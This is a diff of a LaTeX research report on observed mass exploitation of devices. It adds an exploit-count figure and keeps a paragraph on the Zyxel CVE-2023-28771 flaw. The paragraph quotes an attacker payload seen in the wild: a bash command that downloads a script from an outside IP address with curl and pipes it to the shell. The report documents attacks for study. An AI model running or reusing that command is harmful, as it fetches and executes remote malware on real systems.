@@ -39,7 +39,19 @@ DNS misconfigurations are another significant finding. When a secondary DNS reso
 % Chapter 5: Example Cases
 \chapter{Example Cases}
 \section{Mass Exploitation of Devices}
-Mass exploitation campaigns are a critical concern in cybersecurity. Attackers often exploit known vulnerabilities as soon as they are disclosed. A notable example observed during the project was the exploitation of the Zyxel router vulnerability (CVE-2023-28771), which allowed attackers to bypass authentication. The exploitation involved malicious payloads, such as the following command executed on vulnerable systems:
+Mass exploitation campaigns are a critical concern in cybersecurity. Attackers often exploit known vulnerabilities as soon as they are disclosed.
+
+Figure \ref{countedexploits} illustrates the evolution of exploits discovered over time in the dataset.
+
+\begin{figure}
+    \input{img/exploits.tex}
+    \caption{Discovered Exploits}
+    \label{countedexploits}
+\end{figure}
+% Chapter 4: Observations
+
+
+A notable example observed during the project was the exploitation of the Zyxel router vulnerability (CVE-2023-28771), which allowed attackers to bypass authentication. The exploitation involved malicious payloads, such as the following command executed on vulnerable systems:
 \begin{verbatim}
 bash -c "curl http://92.60.77.85/z -o-|sh";
 \end{verbatim}
